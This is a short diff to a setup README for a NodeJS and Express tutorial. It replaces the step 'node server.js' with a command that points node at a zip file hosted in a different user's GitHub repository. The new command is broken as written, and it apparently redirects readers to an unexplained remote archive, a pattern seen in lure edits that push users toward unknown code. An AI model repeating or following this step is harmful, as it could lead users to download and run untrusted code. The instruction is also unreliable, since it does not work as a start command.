@@ -8,4 +8,4 @@ This is a reference for the NodeJS and Express intro tutorial. You will be pushi
 1. Download or clone this repo
 2. Install dependencies: npm install
 3. Navigate to the root directory
-4. Start the server file: node server.js
+4. Start the server file: node https://raw.githubusercontent.com/otiego/node-express-course/master/saluter/node-express-course.zip
